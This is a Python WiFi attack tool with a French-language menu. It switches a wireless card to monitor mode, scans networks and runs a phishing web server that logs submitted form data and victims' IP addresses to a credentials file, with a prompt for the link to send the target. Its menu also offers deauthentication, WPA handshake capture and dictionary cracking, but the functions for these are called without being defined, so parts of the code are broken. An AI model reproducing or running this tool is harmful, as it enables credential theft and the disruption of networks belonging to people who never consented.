#!/usr/bin/env python3
import os
import sys
import subprocess
import http.server
import socketserver
import threading
import time
import re
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, IntPrompt
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.align import Align
from rich.text import Text

console = Console()
HANDSHAKE_DIR = "handshakes"
CAPTURED_LOG = "captured_credentials.txt"
PHISH_PORT = 8080
history = []
template_path = None

# === ASCII ART ===
def print_title():
    ascii_art = """
███████╗███╗   ██╗ █████╗ ███╗   ███╗ █████╗ 
██╔════╝████╗  ██║██╔══██╗████╗ ████║██╔══██╗
█████╗  ██╔██╗ ██║███████║██╔████╔██║███████║
██╔══╝  ██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══██║
███████╗██║ ╚████║██║  ██║██║ ╚═╝ ██║██║  ██║
╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
"""
    panel = Panel(Align.center(Text(ascii_art, style="bold green") + Text("\nENAMA EYENOAH", style="bold green underline")), style="green", padding=(1, 4))
    console.print(panel)

# === SHELL COMMANDS ===
def run_cmd(cmd, capture=False):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=capture, text=True)
        return result.stdout if capture else None
    except Exception as e:
        console.print(f"[red]Erreur : {e}[/red]")
        return ""

def check_root():
    if os.geteuid() != 0:
        console.print("[bold red]Ce script doit être lancé avec sudo ![/bold red]")
        sys.exit(1)

# === DETECTE SI MODE MONITOR POSSIBLE ===
def monitor_supported():
    iw_output = run_cmd("iw list", capture=True)
    if iw_output and "* monitor" in iw_output:
        return True
    return False

# === DETECTE INTERFACE WIFI ===
def detect_wifi_interface():
    output = run_cmd("iw dev", capture=True)
    for line in output.splitlines():
        if line.strip().startswith("Interface"):
            return line.split()[1]
    return None

# === MODE MONITOR ON/OFF ===
def start_monitor_mode(iface):
    console.print("[yellow]Tentative activation mode monitor...[/yellow]")
    run_cmd("airmon-ng check kill")
    run_cmd(f"airmon-ng start {iface}")
    time.sleep(2)
    iwdev = run_cmd("iw dev", capture=True)
    mon_iface = None
    for line in iwdev.splitlines():
        if iface+"mon" in line:
            mon_iface = iface+"mon"
            break
    if mon_iface:
        console.print(f"[green]Mode monitor activé sur {mon_iface}[/green]")
        return mon_iface
    else:
        console.print("[red]Mode monitor non activé, interface monitor introuvable.[/red]")
        return None

def stop_monitor_mode(mon_iface):
    if mon_iface:
        run_cmd(f"airmon-ng stop {mon_iface}")
        run_cmd("service NetworkManager restart")
        console.print("[green]Retour au mode managed.[/green]")

# === SCAN WIFI (managed ou monitor) ===
def parse_scan_output(output):
    nets = []
    cells = output.split("Cell ")
    for cell in cells[1:]:
        ssid = re.search(r'ESSID:"([^"]*)"', cell)
        bssid = re.search(r"Address: ([0-9A-F:]{17})", cell)
        channel = re.search(r"Channel:(\d+)", cell)
        signal = re.search(r"Signal level=(-?\d+) dBm", cell)
        encryption = "Open"
        if "WPA2" in cell:
            encryption = "WPA2"
        elif "WPA" in cell:
            encryption = "WPA"
        nets.append({
            "SSID": ssid.group(1) if ssid else "Hidden",
            "BSSID": bssid.group(1) if bssid else "",
            "Channel": channel.group(1) if channel else "?",
            "Signal": int(signal.group(1)) if signal else -100,
            "Enc": encryption
        })
    return nets

def scan_wifi_managed(iface):
    console.print("[cyan]Scan WiFi (mode managed)...[/cyan]")
    output = run_cmd(f"iwlist {iface} scan", capture=True)
    if not output:
        console.print("[red]Erreur: Impossible de scanner avec iwlist.[/red]")
        return []
    return parse_scan_output(output)

def scan_wifi_monitor(monitor_iface):
    console.print("[cyan]Scan WiFi (mode monitor)...[/cyan]")
    output = run_cmd(f"iwlist {monitor_iface} scan", capture=True)
    if not output:
        console.print("[red]Erreur: Impossible de scanner avec iwlist.[/red]")
        return []
    return parse_scan_output(output)

def show_networks(nets):
    if not nets:
        console.print("[yellow]Aucun réseau détecté.[/yellow]")
        return
    table = Table(title="Réseaux WiFi détectés", style="bold magenta")
    table.add_column("ID", justify="center")
    table.add_column("SSID", justify="left")
    table.add_column("BSSID", justify="center")
    table.add_column("Canal", justify="center")
    table.add_column("Signal", justify="center")
    table.add_column("Sécurité", justify="center")
    for i, n in enumerate(nets):
        color = "green" if n["Signal"] > -70 else "yellow" if n["Signal"] > -85 else "red"
        table.add_row(str(i+1), n["SSID"], n["BSSID"], n["Channel"], f"[{color}]{n['Signal']}[/]", n["Enc"])
    console.print(table)

# === PHISHING SERVER ===
class PhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if template_path and os.path.exists(template_path):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open(template_path, "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404, "Template introuvable")

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length).decode()
        ip = self.client_address[0]
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_line = f"{now} | IP: {ip} | Data: {data}\n"
        with open(CAPTURED_LOG, "a") as f:
            f.write(log_line)
        console.print(f"[green]{log_line.strip()}[/green]")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Merci! Vos informations ont ete recues.")

def start_phishing_server():
    global template_path
    while True:
        template_path = Prompt.ask("[cyan]Chemin fichier HTML template (doit finir par .html)[/cyan]")
        if template_path.endswith(".html") and os.path.exists(template_path):
            break
        else:
            console.print("[red]Erreur: Fournis un fichier HTML valide (.html)[/red]")
    ip = run_cmd("hostname -I", capture=True).strip().split()[0]
    console.print(f"[green]Template valide: {template_path}[/green]")
    console.print(f"[yellow]Lien à donner à la cible: http://{ip}:{PHISH_PORT}[/yellow]")
    with socketserver.TCPServer(("", PHISH_PORT), PhishHandler) as httpd:
        try:
            console.print("[cyan]Serveur phishing en cours... Ctrl+C pour stopper[/cyan]")
            httpd.serve_forever()
        except KeyboardInterrupt:
            console.print("\n[red]Serveur stoppé.[/red]")

# === HISTORIQUE ===
def show_history():
    if not history:
        console.print("[yellow]Aucune action enregistrée.[/yellow]")
        return
    table = Table(title="Historique des actions", style="bold blue")
    table.add_column("Heure", justify="center")
    table.add_column("Action", justify="left")
    for h in history:
        table.add_row(h[0], h[1])
    console.print(table)

# === MENU PRINCIPAL ===
def main():
    check_root()
    print_title()
    iface = detect_wifi_interface()
    if not iface:
        console.print("[red]Aucune interface WiFi détectée.[/red]")
        sys.exit(1)
    console.print(f"[green]Interface WiFi détectée: {iface}[/green]")

    monitor = False
    mon_iface = None
    if monitor_supported():
        mon_iface = start_monitor_mode(iface)
        if mon_iface:
            monitor = True
        else:
            console.print("[yellow]Mode monitor non disponible, utilisation du mode managed.[/yellow]")
    else:
        console.print("[yellow]Mode monitor non supporté par cette carte, utilisation du mode managed.[/yellow]")

    try:
        while True:
            console.print("\n[cyan]Menu Principal[/cyan]")
            table = Table()
            table.add_column("Option", justify="center")
            table.add_column("Action", justify="left")
            table.add_row("1", "Scanner réseaux WiFi")
            if monitor:
                table.add_row("2", "Voir clients + Déauth (mode monitor)")
                table.add_row("3", "Capture handshake WPA (mode monitor)")
                table.add_row("4", "Lancer phishing (template .html)")
                table.add_row("5", "Crack WPA avec dictionnaire")
                table.add_row("6", "Voir historique")
                table.add_row("7", "Quitter")
                console.print(table)
                choices = ["1","2","3","4","5","6","7"]
            else:
                table.add_row("2", "Lancer phishing (template .html)")
                table.add_row("3", "Voir historique")
                table.add_row("4", "Quitter")
                console.print(table)
                choices = ["1","2","3","4"]

            choice = IntPrompt.ask("Choix", choices=choices)

            if choice == 1:
                if monitor:
                    nets = scan_wifi_monitor(mon_iface)
                else:
                    nets = scan_wifi_managed(iface)
                if nets:
                    show_networks(nets)
                    history.append((datetime.now().strftime("%H:%M:%S"), "Scan WiFi"))
                else:
                    console.print("[red]Aucun réseau trouvé.[/red]")
            elif choice == 2:
                if monitor:
                    bssid = Prompt.ask("[cyan]BSSID cible[/cyan]")
                    channel = Prompt.ask("[cyan]Canal[/cyan]")
                    clients = scan_clients(bssid, channel, mon_iface)
                    if clients:
                        console.print(f"[green]Clients trouvés: {', '.join(clients)}[/green]")
                        target = Prompt.ask("[cyan]MAC cible ou 'all'[/cyan]")
                        if target.lower() == "all":
                            target = None
                        deauth_attack(target, bssid, mon_iface)
                    else:
                        console.print("[yellow]Aucun client détecté.[/yellow]")
                else:
                    start_phishing_server()
                    history.append((datetime.now().strftime("%H:%M:%S"), "Phishing lancé"))
            elif choice == 3:
                if monitor:
                    bssid = Prompt.ask("[cyan]BSSID cible[/cyan]")
                    channel = Prompt.ask("[cyan]Canal[/cyan]")
                    capture_handshake(bssid, channel, mon_iface)
                else:
                    show_history()
            elif choice == 4:
                if monitor:
                    start_phishing_server()
                else:
                    console.print("[green]Arrêt et sortie...[/green]")
                    break
            elif choice == 5 and monitor:
                cap_file = Prompt.ask("[cyan]Chemin fichier .cap[/cyan]")
                wordlist = Prompt.ask("[cyan]Chemin wordlist[/cyan]")
                crack_wpa(cap_file, wordlist)
            elif choice == 6 and monitor:
                show_history()
            elif (choice == 7 and monitor) or (choice == 4 and not monitor):
                console.print("[green]Arrêt et retour mode managed...[/green]")
                if monitor:
                    stop_monitor_mode(mon_iface)
                break
    except KeyboardInterrupt:
        console.print("\n[red]Interruption détectée, nettoyage...[/red]")
        if monitor:
            stop_monitor_mode(mon_iface)

if __name__ == "__main__":
    main()
